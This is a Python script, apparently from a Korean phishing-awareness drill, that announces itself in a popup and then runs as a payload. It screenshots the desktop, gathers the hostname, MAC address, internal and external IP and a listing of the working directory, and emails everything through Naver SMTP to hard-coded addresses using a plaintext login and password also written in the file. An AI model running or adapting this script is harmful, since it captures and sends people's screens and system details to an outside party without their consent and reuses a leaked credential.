import socket
from email.mime.image import MIMEImage
from string import Template

import getmac
import requests
from bs4 import BeautifulSoup


# E-mail Library
import smtplib, os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

from PIL import ImageGrab

from tkinter import messagebox as msg
from tkinter import Tk

root= Tk()
root.withdraw()
msg.showinfo('-', '모의 바이러스 메일 훈련입니다.')

img = ImageGrab.grab()
imageN= 'screenshot.png'
img.save(imageN)

def checkip():

    res = requests.get('http://checkip.dyndns.org')# 아이피 알려주는 단순 사이트에 접속해 값 리턴
    soup = BeautifulSoup(res.text, 'lxml')

    ip = soup.find("body").text.split()
    return ip[3]

def sendEmailfunc(text):
    id = '1846524@naver.com'
    password = 'austpwja@2'
    sendEmail = '1846524@naver.com'
    today = datetime.today().strftime("%Y/%m/%d %H:%M:%S")
    subject = '[' + today + ' 클릭] - 모의바이러스 메일 훈련용'
    addrs = ['1004gmyoul@naver.com', '1846524@naver.com']  # send mail list

    # login
    smtp = smtplib.SMTP('smtp.naver.com', 587)
    smtp.ehlo()
    smtp.starttls()
    smtp.login(id, password)

    for addr in addrs:
        # message
        message = MIMEMultipart()
        message.attach(MIMEText(text, 'html'))

        #image attach
        assert os.path.isfile(imageN), 'image file does not exist.'
        with open(imageN, 'rb') as img_file:
            mime_img = MIMEImage(img_file.read(), name=imageN)
        message.attach(mime_img)

        # Send
        message["From"] = sendEmail
        message["To"] = addr
        message['Subject'] = subject
        smtp.sendmail(sendEmail, addr, message.as_string())

    smtp.quit()

text = ""
text = "> 호스트명 : ", socket.gethostname(),"<br>","> MAC주소 : ", getmac.get_mac_address(),\
       "<br>", "> IP주소(내부) : ", socket.gethostbyname(socket.gethostname()),\
       "<br>", "> IP주소(외부) : ", checkip(), "<br>", "> 파일목록 : ",os.getcwd(),'<br><br>&nbsp;-&nbsp;',"<br>&nbsp;-&nbsp;".join(os.listdir(os.getcwd()))
# print ("".join(text))
sendEmailfunc("".join(text))
